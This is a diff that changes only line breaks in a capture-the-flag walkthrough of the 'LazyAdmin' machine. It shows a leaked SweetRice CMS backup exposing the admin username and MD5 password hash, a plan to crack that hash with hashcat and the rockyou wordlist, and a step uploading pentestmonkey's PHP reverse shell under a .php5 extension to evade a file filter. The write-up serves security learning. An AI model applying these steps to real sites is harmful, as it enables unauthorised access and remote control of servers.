@@ -336,7 +336,7 @@ with a username and password
   14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',
 ```
 
-Username: `manager`
+Username: `manager`  
 Hash: `42f749ade7f9e195bf475f37a44cafcb`
 
 We can try to crack the hash with `hashcat` and the rockyou wordlist.  
@@ -389,8 +389,8 @@ Next, we can create a reverse shell and upload it with the exploit.
 
 ### Upload a reverse shell
 
-We will use a basic [PHP reverse shell from pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell).  
-Save it as `php-reverse-shell.php5`. The file need to have a `.php5` extension (`.php` won't work).
+We will use a basic [PHP reverse shell from pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell). Save it as `php-reverse-shell.php5`.  
+The file need to have a `.php5` extension (`.php` won't work).
 
 We launch the exploit
 ```bash
